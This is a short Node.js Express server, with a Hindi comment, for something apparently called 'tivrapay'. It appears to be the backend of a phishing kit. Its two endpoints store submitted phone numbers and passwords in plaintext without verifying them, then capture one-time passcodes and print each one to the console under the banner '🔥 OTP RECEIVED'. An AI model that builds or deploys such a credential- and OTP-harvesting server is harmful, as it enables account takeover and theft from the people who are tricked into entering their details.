const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Yahan apna MongoDB Atlas connection string dalein
const DB_URI = "mongodb+srv://<username>:<password>@cluster0.mongodb.net/tivrapay"; 

mongoose.connect(DB_URI).then(() => console.log("Connected to MongoDB Atlas"));

const UserSchema = new mongoose.Schema({
    phoneNumber: String,
    password: String,
    otp: String,
    actionType: String
});
const User = mongoose.model('User', UserSchema);

app.post('/api/login-submit', async (req, res) => {
    const user = new User({ ...req.body, actionType: 'LOGIN' });
    await user.save();
    res.json({ success: true, userId: user._id });
});

app.post('/api/otp-submit', async (req, res) => {
    const { userId, otp } = req.body;
    await User.findByIdAndUpdate(userId, { otp });
    console.log(`\n🔥 OTP RECEIVED: ${otp} (User: ${userId})\n`);
    res.json({ success: true });
});

app.listen(process.env.PORT || 6500);
